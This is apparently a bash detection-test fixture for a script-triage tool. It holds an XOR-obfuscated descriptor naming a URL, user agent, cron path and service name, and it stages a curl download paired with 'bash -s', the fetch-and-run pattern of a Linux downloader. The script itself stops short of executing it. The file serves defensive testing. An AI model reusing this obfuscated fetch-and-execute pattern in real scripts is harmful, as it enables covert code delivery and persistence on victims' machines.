#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_19a8202e='250:160:169:161:174:251:174:253:252:173:182:251:248:213:234:234:252:235:237:247:236:209:164:237:247:252:254:248:198:235:252:234:236:229:241:234:183:250:248:255:172:169:161:173:251:182:253:240:245:248:239:247:240:183:252:245:233:244:248:225:252:183:250:160:169:161:174:251:174:253:252:173:182:182:163:234:233:237:237:241:164:245:235:236:229:250:160:169:161:174:251:174:253:252:173:180:247:254:240:248:233:244:248:250:164:253:240:198:247:254:240:248:233:244:248:250:229:168:164:237:247:236:246:250:198:252:254:248:237:234:229:252:233:240:233:198:237:236:246:253:237:234:198:245:235:236:250:164:235:252:237:233:248:253:248:229:252:233:240:233:198:241:250:237:248:233:234:240:253:181:252:237:246:244:252:235:198:252:235:240:236:232:250:248:164:234:233:252:237:234:229:168:164:239'
readonly Codec_19a8202e='decimal_colon|reverse_then_xor|99'

Load_19a8202e() {
  e=()
  local IFS=':'
  read -r -a e <<< "${Material_19a8202e}"
}

Decode_19a8202e() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d[${#e[@]}-1-i]="$((e[i] ^ 153))"
  done
}

Recover_19a8202e() {
  local -a e d
  local t n z i
  n=$((19 * 7 - 133))
  Load_19a8202e
  for z in 1; do Decode_19a8202e; done
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_19a8202e() { local recovered; recovered="$(Recover_19a8202e)"; printf '%s\n' "$recovered"; }

Plan_19a8202e() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_19a8202e)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_19a8202e; fi
